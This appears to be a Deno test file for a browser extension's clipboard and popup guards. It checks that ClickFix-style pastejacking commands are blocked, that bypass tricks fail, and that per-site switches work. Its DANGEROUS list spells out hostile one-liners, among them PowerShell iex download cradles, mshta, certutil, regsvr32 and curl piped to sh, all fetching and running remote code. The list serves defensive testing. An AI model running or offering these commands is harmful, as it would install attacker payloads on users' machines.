// Block J: page guards (clipboard on, popups off), never on stream sites.
import "../src/settings/features.js";
import "../src/general/filter-options.js";
import "../src/threat/psl.js";
import "../src/threat/protected-hosts.js";
import "../src/threat/compile.js";
import clipboardSource from "../src/guards/clipboard.js" with { type: "text" };
import popupsSource from "../src/guards/popups.js" with { type: "text" };
import updateSource from "../src/general/update.js" with { type: "text" };
import manifest from "../manifest.json" with { type: "json" };
import { unwrapMain } from "./fixtures/main-source.mjs";
function assert(c, l) { if (!c) throw new Error(l); }
const F = globalThis.GeckoFeatures;
const loadClip = () => { const api = {}; new Function(`${unwrapMain(clipboardSource)}\nreturn installClipboardGuard;`)()(api); return api; };
const loadPop = () => { const api = {}; new Function(`${unwrapMain(popupsSource)}\nreturn installPopupGuard;`)()(api); return api; };

const DANGEROUS = [
  "powershell -w hidden -nop -c \"iex (iwr 'http://203.0.113.5/a.ps1' -UseBasicParsing)\"",
  "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
  "pwsh -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
  "powershell -c \"(New-Object Net.WebClient).DownloadString('https://example.test/x')|iex\"",
  "iex(irm https://example.test/run)",
  "cmd /c start /min mshta https://example.test/verify.hta",
  "cmd.exe /c curl -s https://example.test/p.bat -o %TEMP%\\p.bat && %TEMP%\\p.bat",
  "mshta https://example.test/captcha.hta # I am not a robot - reCAPTCHA Verification ID: 4821",
  "mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run\"\"calc\"\":close\")",
  "bitsadmin /transfer job /download /priority high https://example.test/a.exe %TEMP%\\a.exe",
  "certutil -urlcache -split -f https://example.test/a.exe a.exe",
  "rundll32 javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write()",
  "regsvr32 /s /n /u /i:https://example.test/file.sct scrobj.dll",
  "msiexec /i https://example.test/setup.msi /qn",
  "curl -fsSL https://example.test/install.sh | sh",
  "wget -qO- https://example.test/x | sudo bash",
  "echo Y3VybCAtcyBodHRwczovL2V4YW1wbGUudGVzdA== | base64 -d | bash",
  "osascript -e 'do shell script \"curl -s https://example.test/x | sh\"'",
];
const BENIGN = [
  "npm install --save-dev typescript",
  "git clone https://github.com/example/repo.git",
  "curl -o file.zip https://example.test/file.zip",
  "pip install requests",
  "Get-ChildItem -Recurse | Select-Object Name",
  "PowerShell is a task automation shell from Microsoft.",
  "Order #4821 - your verification code is 552193",
  "https://example.test/watch?v=abc",
  "cmd /c dir",
  "sudo apt update && sudo apt install -y curl",
  "",
];

Deno.test("clipboard guard patterns: ClickFix-style commands match, ordinary snippets and text do not", () => {
  const g = loadClip();
  for (const s of DANGEROUS) assert(g.matchDangerous(s), "missed: " + s);
  for (const s of BENIGN) assert(!g.matchDangerous(s), "false positive: " + s);
});

Deno.test("clipboard guard: docs hosts and deliberate copies are allowed; a copy label alone is not enough", () => {
  const g = loadClip();
  for (const h of ["github.com", "docs.github.com", "developer.mozilla.org", "brew.sh"]) assert(g.onSafeHost(h), h);
  // readthedocs.io / .org: anyone can publish pages and scripts on a subdomain (M-2).
  for (const h of ["github.com.evil.example", "notgithub.com", "captcha-verify.example", "pkg.readthedocs.io", "evil.readthedocs.org"]) assert(!g.onSafeHost(h), h);
  const el = (attrs, text, parent, shown) => ({ getAttribute: (k) => attrs[k] ?? null, className: attrs.class || "", id: attrs.id || "", textContent: text || "", innerText: shown ?? text ?? "", parentElement: parent || null });
  const now = 10000;
  const cmd = "curl -fsSL https://example.test/install.sh | sh";
  // Copy shortcut: only for text that was part of the selection at the key press.
  assert(g.deliberateCopy({ kind: "key", at: now - 100, copyKey: true, sel: "run: " + cmd }, now, cmd), "Ctrl+C on the selected command");
  assert(!g.deliberateCopy({ kind: "key", at: now - 100, copyKey: true, sel: "some article text" }, now, cmd), "pastejacking: copy handler swaps in a command");
  assert(!g.deliberateCopy({ kind: "key", at: now - 100, copyKey: false, sel: cmd }, now, cmd), "other key");
  // Copy button: label AND the text visible next to it.
  const block = el({ class: "highlight" }, "$ " + cmd + "\nCopy", null);
  assert(g.deliberateCopy({ kind: "click", at: now - 100, target: el({ "aria-label": "Copy to clipboard" }, "", block) }, now, cmd), "copy button next to its code block");
  assert(g.deliberateCopy({ kind: "click", at: now - 100, target: el({}, "", el({ class: "btn copy-code" }, "", block)) }, now, cmd), "copy class on a parent");
  assert(!g.deliberateCopy({ kind: "click", at: now - 100, target: el({ "aria-label": "Copy" }, "Copy") }, now, cmd), "copy label alone (text not shown)");
  assert(!g.deliberateCopy({ kind: "click", at: now - 100, target: el({ "aria-label": "Copy" }, "", el({}, "Copy " + cmd, null, "Copy")) }, now, cmd), "text only in hidden markup (innerText lacks it)");
  assert(!g.deliberateCopy({ kind: "click", at: now - 100, target: el({ id: "recaptcha-anchor" }, "I'm not a robot", el({}, "I'm not a robot " + cmd)) }, now, cmd), "fake captcha");
  assert(!g.deliberateCopy({ kind: "click", at: now - 5000, target: el({ "aria-label": "Copy" }, "", block) }, now, cmd), "stale click");
  assert(!g.deliberateCopy(null, now, cmd), "no input");
  // An element whose methods throw counts as "not deliberate" (no fail-open bypass).
  const evil = { getAttribute() { throw new Error("x"); }, get parentElement() { throw new Error("x"); } };
  assert(!g.deliberateCopy({ kind: "click", at: now - 100, target: evil }, now, cmd), "throwing element");
});

function fakePage(host, opts = {}) {
  const listeners = {};
  const written = [];
  const notices = [];
  let selection = "";
  class Clipboard { writeText(t) { written.push(t); return Promise.resolve(); } }
  const clipboard = new Clipboard();
  // Like Chrome: execCommand lives on Document.prototype, the page object is an HTMLDocument.
  class Document { execCommand(cmd) { if (cmd === "copy" || cmd === "cut") written.push(cmd + ":" + selection); return true; } }
  class HTMLDocument extends Document {}
  const document = new HTMLDocument();
  document.addEventListener = (t, f) => { (listeners[t] ||= []).push(f); };
  document.activeElement = null;
  class DataTransfer { constructor() { this.data = {}; } setData(t, v) { this.data[t] = v; } }
  class Selection { toString() { return selection; } }
  const window = { getSelection: () => new Selection(), Selection, DataTransfer, Document };
  const g = loadClip();
  let flag = opts.flag !== undefined ? opts.flag : true;
  let t = 1000;
  g.install({ window, document, navigator: { clipboard }, location: { hostname: host }, now: () => t, notify: (id) => notices.push(id), flagOn: () => { if (flag === "throw") throw new Error("x"); return flag; } });
  return {
    g, written, notices, clipboard, document, window, Document, setFlag: (v) => { flag = v; },
    select: (s) => { selection = s; },
    tick: (ms) => { t += ms; },
    input: (type, e) => { for (const f of listeners[type] || []) f(Object.assign({ isTrusted: true }, e)); },
  };
}

Deno.test("clipboard guard blocks a page writing a dangerous command (writeText, execCommand copy/cut, copy-event setData) and shows a notice", async () => {
  const p = fakePage("captcha-check.example");
  const bad = DANGEROUS[0];
  let rejected = false;
  await p.clipboard.writeText(bad).catch((e) => { rejected = e.name === "NotAllowedError"; });
  assert(rejected && p.written.length === 0 && p.notices.length === 1, "writeText blocked " + JSON.stringify({ rejected, w: p.written, n: p.notices }));
  await p.clipboard.writeText("hello there");
  assert(p.written[0] === "hello there", "benign text still copies");
  p.select(DANGEROUS[5]);
  assert(p.document.execCommand("copy") === false && p.written.length === 1, "execCommand copy of a selected command blocked");
  assert(p.document.execCommand("cut") === false && p.written.length === 1, "execCommand cut of a selected command blocked");
  // The native method on Document.prototype is wrapped too (M-2).
  assert(p.Document.prototype.execCommand.call(p.document, "copy") === false && p.written.length === 1, "Document.prototype.execCommand.call bypass");
  p.select("just some text");
  assert(p.document.execCommand("copy") === true, "normal selection copies");
  const dt = new p.window.DataTransfer();
  dt.setData("text/plain", DANGEROUS[1]);
  assert(dt.data["text/plain"] === undefined, "copy handler cannot swap in a command");
  dt.setData("text/plain", "fine");
  assert(dt.data["text/plain"] === "fine", "normal setData works");
});

Deno.test("clipboard guard coerces once: a value that changes on each toString cannot pass the check and write something else (M-2)", async () => {
  const p = fakePage("captcha-check.example");
  const flip = (first, then) => { let n = 0; return { toString: () => (n++ === 0 ? first : then) }; };
  let rejected = false;
  await p.clipboard.writeText(flip("harmless text", DANGEROUS[0])).catch(() => { rejected = true; });
  assert(!rejected && p.written.length === 1 && p.written[0] === "harmless text", "the checked string is the written one: " + JSON.stringify(p.written));
  const dt = new p.window.DataTransfer();
  dt.setData("text/plain", flip("fine", DANGEROUS[1]));
  assert(dt.data["text/plain"] === "fine", "setData writes the checked string");
  const dt2 = new p.window.DataTransfer();
  dt2.setData(flip("text/plain", "x-other"), DANGEROUS[1]);
  assert(dt2.data["text/plain"] === undefined && dt2.data["x-other"] === undefined, "type coerced once too");
  p.select(DANGEROUS[5]);
  assert(p.document.execCommand(flip("copy", "copy")) === false, "command coerced once");
  assert(p.document.execCommand(flip("bold", "copy")) === true && p.written.at(-1) !== "copy:" + DANGEROUS[5], "a 'bold' that turns into 'copy' does not copy");
});

Deno.test("clipboard guard: copy shortcut and copy button rules in the installed guard", async () => {
  const cmd = "curl -fsSL https://example.test/install.sh | sh";
  // Ctrl+C on a selected command: allowed. A copy handler swapping in another command: blocked.
  const p = fakePage("blog.example");
  p.select("install with: " + cmd);
  p.input("keydown", { key: "c", ctrlKey: true });
  await p.clipboard.writeText(cmd);
  assert(p.written.length === 1, "copy shortcut on the selection");
  p.select("an ordinary paragraph");
  p.input("keydown", { key: "c", ctrlKey: true });
  let rejected = false;
  await p.clipboard.writeText(DANGEROUS[14]).catch(() => { rejected = true; });
  assert(rejected && p.written.length === 1, "pastejacking blocked");
  // The page changes the selection right after the key press: still the visitor's selection counts.
  p.select("an ordinary paragraph");
  p.input("keydown", { key: "c", ctrlKey: true });
  p.select(DANGEROUS[5]);
  assert(p.document.execCommand("copy") === false, "selection swapped after the key press");
  // Copy button: label + the command visible next to it.
  const q = fakePage("blog.example");
  const block = { getAttribute: () => null, className: "codeblock", id: "", textContent: cmd, innerText: cmd, parentElement: null };
  q.input("click", { target: { getAttribute: (k) => (k === "aria-label" ? "Copy code" : null), className: "", id: "", textContent: "", innerText: "", parentElement: block } });
  await q.clipboard.writeText(cmd);
  assert(q.written.length === 1, "copy button next to the command");
  const r = fakePage("blog.example");
  r.input("click", { target: { getAttribute: (k) => (k === "aria-label" ? "Copy code" : null), className: "", id: "", textContent: "Copy", innerText: "Copy", parentElement: null } });
  rejected = false;
  await r.clipboard.writeText(cmd).catch(() => { rejected = true; });
  assert(rejected && r.written.length === 0, "a copy label alone is not enough");
});

Deno.test("clipboard guard allows docs hosts and the switch off, and fails open on errors", async () => {
  const docs = fakePage("docs.github.com");
  await docs.clipboard.writeText("curl -fsSL https://example.test/install.sh | sh");
  assert(docs.written.length === 1, "docs host");
  const off = fakePage("captcha-check.example", { flag: false });
  await off.clipboard.writeText(DANGEROUS[0]);
  assert(off.written.length === 1, "switch off");
  const broken = fakePage("captcha-check.example", { flag: "throw" });
  await broken.clipboard.writeText(DANGEROUS[0]);
  assert(broken.written.length === 1, "fail open");
});

Deno.test("popup guard: no gesture, a second window per click and popunders are blocked; links, buttons, same site and sign-in pages open", () => {
  const g = loadPop();
  const loc = { href: "https://news.example/a", hostname: "news.example" };
  const ctx = (o) => Object.assign({ location: loc, activation: true, opensThisGesture: 0, lastClickTarget: {}, lastClickInteractive: true }, o);
  assert(g.judge("https://ads.example/x", ctx({ activation: false })) === "no user gesture", "no gesture");
  assert(g.judge("https://ads.example/x", ctx({ opensThisGesture: 1 })) === "second window in one click", "second window");
  assert(/popunder/.test(g.judge("https://ads.example/x", ctx({ lastClickInteractive: false }))), "popunder");
  assert(g.judge("https://ads.example/x", ctx({})) === null, "button click opens a window");
  assert(g.judge("/other-page", ctx({ activation: false })) === null, "same site");
  assert(g.judge("https://cdn.news.example/x", ctx({ activation: false })) === null, "same site subdomain");
  assert(g.judge("https://accounts.google.com/o/oauth2", ctx({ activation: false })) === null, "sign-in");
  assert(g.judge("about:blank", ctx({ activation: false })) === null, "about:blank");
  assert(g.judge("javascript:alert(1)", ctx({ activation: false })) === "no user gesture", "non-http without a gesture");
});

Deno.test("popup guard wrapper: default off until the switch says on; blocks then; fails open", () => {
  const g = loadPop();
  const opened = [];
  const listeners = {};
  let flag = false;
  const win = { open: (u) => { opened.push(u); return {}; } };
  const nav = { userActivation: { isActive: false } };
  g.install({ window: win, document: { addEventListener: (t, f) => { listeners[t] = f; } }, navigator: nav, location: { href: "https://news.example/", hostname: "news.example" }, now: () => 5000, flagOn: () => { if (flag === "throw") throw new Error("x"); return flag; } });
  win.open("https://ads.example/");
  assert(opened.length === 1, "off by default: opens");
  flag = true;
  assert(win.open("https://ads.example/") === null && opened.length === 1, "on: blocked without gesture");
  nav.userActivation.isActive = true;
  listeners.click({ isTrusted: true, target: { closest: () => ({ tagName: "BUTTON" }) } });
  win.open("https://share.example/");
  assert(opened.length === 2, "button click opens one");
  assert(win.open("https://ads.example/2") === null, "second in the same click blocked");
  flag = "throw";
  win.open("https://ads.example/3");
  assert(opened.length === 3, "fail open");
});

Deno.test("manifest: guards and their flag script run on ordinary sites only (exclude list generated from the registry)", () => {
  const guards = manifest.content_scripts.find((c) => c.js.includes("src/guards/clipboard.js"));
  assert(guards && guards.world === "MAIN" && guards.all_frames === true && guards.run_at === "document_start" && guards.js.includes("src/guards/popups.js"), "guard entry");
  const flags = manifest.content_scripts.find((c) => c.js.includes("src/settings/flags.js") && c.matches.includes("https://*/*"));
  assert(flags && flags.world !== "MAIN" && flags.all_frames === true && flags.js[0] === "src/settings/features.js", "flags entry for ordinary sites");
  for (const e of [guards, flags]) {
    assert(JSON.stringify([...e.exclude_matches].sort()) === JSON.stringify(F.streamExcludeMatches().sort()), "exclude_matches from the registry");
    assert(JSON.stringify(e.matches) === JSON.stringify(["http://*/*", "https://*/*"]), "ordinary sites");
  }
  assert(F.byId("guardClipboard").default === true && F.byId("guardPopups").default === false, "defaults (D-4)");
  assert(F.resolve(null, null, "news.example").guardClipboard && !F.resolve(null, null, "news.example").guardPopups, "resolved defaults");
  assert(/PAGE_FLAGS = \[[^\]]*"guardClipboard"[^\]]*"guardPopups"/.test(Deno.readTextFileSync(new URL("../src/settings/flags.js", import.meta.url))), "flags handed to the guards");
});

Deno.test("threat lists' $popup-only hosts become main_frame-only threat rules (protected hosts still rejected)", () => {
  const U = {};
  new Function(`${updateSource}\nreturn installGeneralAdblockUpdate;`)()(U);
  const parsed = U.parseEntries(["||popfraud.example^$popup", "||popboth.example^$popup,third-party", "||docpop.example^$doc,popup", "||kick.com^$popup", "||plain.example^"].join("\n"));
  assert(JSON.stringify(parsed.popup) === JSON.stringify(["popfraud.example", "kick.com"]), JSON.stringify(parsed));
  const TC = globalThis.GeckoThreatCompile;
  const c = TC.compileThreatRules(TC.threatHostsFromEntries(parsed), { idBase: 1, popupHosts: parsed.popup });
  const popupRule = c.rules.find((r) => r.condition.resourceTypes.length === 1);
  assert(popupRule && popupRule.condition.resourceTypes[0] === "main_frame" && JSON.stringify(popupRule.condition.requestDomains) === JSON.stringify(["popfraud.example"]), JSON.stringify(c.rules));
  assert(c.rejected.some((r) => r.host === "kick.com"), "protected host rejected");
  assert(c.rules.every((r) => r.priority === 2000010), "threat priority");
  // Plain lists never see them (the ordinary tier drops $popup-only filters).
  assert(!parsed.domains.includes("popfraud.example") && !parsed.scoped.some(([d]) => d === "popfraud.example"), "not an ordinary block");
});

// Security review M-1: the page cannot switch the clipboard guard off. Real
// flags.js (ISOLATED) and clipboard.js (MAIN) share one fake window; flags
// come over the private port only, a forged window message changes nothing.
import flagsSource from "../src/settings/flags.js" with { type: "text" };
Deno.test({
  name: "flag port: the clipboard guard takes its switch only from flags.js, not from forged window messages",
  sanitizeOps: false,
  sanitizeResources: false,
  fn: async () => {
    const DANGER = DANGEROUS[0];
    const store = { settings: { v: 1, enabled: true, features: {} }, siteOverrides: {} };
    const changed = [];
    const chrome = {
      runtime: { lastError: undefined, onMessage: { addListener() {} } },
      storage: { local: { get(_k, cb) { cb(structuredClone(store)); } }, onChanged: { addListener(f) { changed.push(f); } } },
    };
    const win = new EventTarget();
    win.top = win;
    win.getSelection = () => "";
    const written = [];
    class Clip { writeText(t) { written.push(t); return Promise.resolve(); } }
    const nav = { clipboard: new Clip() };
    const doc = { addEventListener() {}, createElement() { throw new Error("no DOM"); } };
    const loc = { hostname: "news.example", origin: "https://news.example" };
    const tick = () => new Promise((r) => setTimeout(r, 5));
    // Manifest order on ordinary sites: flags.js (ISOLATED) first, then the guards.
    new Function("chrome", "window", "location", "globalThis", flagsSource)(chrome, win, loc, globalThis);
    new Function("window", "document", "navigator", "location", clipboardSource)(win, doc, nav, loc);
    const tryWrite = async (t) => { try { await nav.clipboard.writeText(t); return true; } catch { return false; } };
    await tick();
    assert(!(await tryWrite(DANGER)) && written.length === 0, "guard on by default");
    assert(await tryWrite("npm install typescript"), "ordinary text still copies");
    // A page forges the old flag message: ignored.
    win.dispatchEvent(new MessageEvent("message", { data: { "gk-f1": { guardClipboard: false } }, source: win }));
    await tick();
    assert(!(await tryWrite(DANGER)), "forged window message switched the guard off");
    // The user switches the guard off for this site: arrives over the port.
    store.siteOverrides = { "news.example": { features: { guardClipboard: false } } };
    changed[0]({ siteOverrides: { newValue: store.siteOverrides } }, "local");
    await tick();
    assert(await tryWrite(DANGER), "user switch did not reach the guard");
  },
});

// Real-browser finding (2026-11-02): an about:blank / srcdoc / blob: frame has
// location.hostname "", so a per-site switch did not reach it. flags.js now
// uses the inherited origin (window.origin, else the nearest ancestor origin).
Deno.test({
  name: "flag port: a blank frame gets its creator site's switches",
  sanitizeOps: false,
  sanitizeResources: false,
  fn: async () => {
    const run = async (win, loc) => {
      const store = { settings: { v: 1, enabled: true, features: {} }, siteOverrides: { "news.example": { features: { guardClipboard: false } } } };
      const chrome = { runtime: { lastError: undefined, onMessage: { addListener() {} } }, storage: { local: { get(_k, cb) { cb(structuredClone(store)); } }, onChanged: { addListener() {} } } };
      let port = null;
      win.addEventListener("gk-p1", (e) => { port = port || e.ports[0]; }, true);
      win.dispatchEvent(new Event("gk-r1"));
      new Function("chrome", "window", "location", "globalThis", flagsSource)(chrome, win, loc, globalThis);
      const got = [];
      port.onmessage = (m) => got.push(m.data);
      await new Promise((r) => setTimeout(r, 5));
      port.close();
      return got.at(-1).f.guardClipboard;
    };
    const blank = Object.assign(new EventTarget(), { origin: "https://news.example" });
    blank.top = {};
    assert(await run(blank, { hostname: "", origin: "null" }) === false, "about:blank frame of news.example");
    const viaAncestor = Object.assign(new EventTarget(), { origin: "null" });
    viaAncestor.top = {};
    assert(await run(viaAncestor, { hostname: "", ancestorOrigins: ["https://news.example"] }) === false, "ancestor origin fallback");
    const sandboxed = Object.assign(new EventTarget(), { origin: "null" });
    sandboxed.top = {};
    assert(await run(sandboxed, { hostname: "" }) === true, "opaque origin keeps the defaults");
  },
});
